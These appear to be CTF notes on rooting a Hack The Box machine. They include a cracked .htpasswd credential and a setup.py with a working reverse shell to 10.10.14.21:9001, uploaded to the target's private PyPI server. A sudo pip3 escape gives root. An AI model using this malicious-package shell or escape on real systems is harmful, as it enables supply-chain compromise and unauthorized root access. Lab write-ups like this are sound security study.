# Getting Root
subdomain  pypi.sneakycorp.htb ,adding to /etc/hosts
![[Pasted image 20211214003739.png]]

```bash
$ cat .htpasswd 
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

Cracking hash
$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
![[Pasted image 20211214010129.png]]

subdomain http://pypi.sneakycorp.htb:8080/  on port 8080
![[Pasted image 20211214004633.png]]

### Create a malicious file and upload on pypi server
https://packaging.python.org/en/latest/tutorials/packaging-projects/

Example of creating a package file

```bash
packaging_tutorial/
├── LICENSE
├── pyproject.toml
├── README.md
├── setup.cfg
├── src/
│   └── example_package/
│       ├── __init__.py
│       └── example.py
└── tests/
```

Create folder pypi/eris(MyPackageName)/__init__.py(no content)

create setup.py instead setup.cfg (insert rev shell in the file) | made some chages to make work

```python
import setuptools
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.21",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);


setuptools.setup(
    name="example-pkg-YOUR-USERNAME-HERE",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    project_urls={
        "Bug Tracker": "https://github.com/pypa/sampleproject/issues",
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)

```


### have to create a .pypirc file to tell our python to point to the server
create .pypirc on home directory  ~/.pypi.rc

```bash
$ cat ~/.pypirc 
[distutils]
index-servers = remote

[remote]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

```bash
python3 setup.py sdist upload -r remote
```

listning on local machine after the connection , open another port to listening again and receive a shell
![[Pasted image 20211214111752.png]]

![[Pasted image 20211214111804.png]]

![[Pasted image 20211214113150.png]]

https://gtfobins.github.io/gtfobins/pip/#sudo

changed pip for pip3
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip3 install $TF
```

![[Pasted image 20211214113406.png]]